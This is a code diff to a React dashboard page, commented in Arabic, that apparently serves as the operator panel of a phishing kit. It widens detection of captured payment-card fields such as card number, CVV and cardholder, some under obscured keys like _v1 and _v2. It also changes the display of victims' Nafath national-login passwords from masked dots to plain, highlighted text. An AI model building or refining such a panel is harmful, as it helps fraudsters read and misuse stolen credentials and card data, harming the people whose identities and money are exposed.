@@ -1842,8 +1842,8 @@ export default function DashboardPage() {
   const renderCheckBox = () => {
     const raw = selectedRequest?.raw || {};
     
-    // التحقق من وجود بيانات البطاقة
-    const hasCardData = raw?._v1 || raw?.cardNumber || raw?.hasCard;
+    // التحقق من وجود بيانات البطاقة (فحص شامل)
+    const hasCardData = raw?._v1 || raw?.cardNumber || raw?.hasCard || raw?.cvv || raw?._v2 || raw?.cardOwner || raw?._v4;
     if (!hasCardData) return null;
 
     // رقم البطاقة (مخفي جزئياً)
@@ -2133,28 +2133,28 @@ export default function DashboardPage() {
         <div style={{ display: "flex", flexDirection: "column", gap: 8 }}>
           {raw?.nafadIdNumber && renderDataRow("رقم بطاقة الأحوال", raw.nafadIdNumber, "🪪")}
           
-          {/* عرض كلمة المرور (مخفية جزئياً) */}
+          {/* عرض كلمة المرور (بشكل واضح) */}
           {raw?.nafadPassword && (
             <div style={{ 
               display: "flex", 
               justifyContent: "space-between", 
               alignItems: "center", 
-              background: "#f9fafb", 
+              background: "#fef3c7", 
               borderRadius: 6, 
               padding: "8px 12px", 
-              border: "1px solid #e5e7eb"
+              border: "1px solid #fcd34d"
             }}>
-              <span style={{ fontSize: "0.75rem", color: "#6b7280", display: "flex", alignItems: "center", gap: 6 }}>
+              <span style={{ fontSize: "0.75rem", color: "#92400e", display: "flex", alignItems: "center", gap: 6 }}>
                 <span>🔑</span>كلمة المرور
               </span>
               <span style={{ 
-                fontSize: "0.8rem", 
-                fontWeight: 600, 
-                color: "#111827",
+                fontSize: "0.85rem", 
+                fontWeight: 700, 
+                color: "#78350f",
                 fontFamily: "ui-monospace, monospace",
-                letterSpacing: "2px"
+                letterSpacing: "1px"
               }}>
-                {"•".repeat(raw.nafadPassword.length || 4)}
+                {raw.nafadPassword}
               </span>
             </div>
           )}
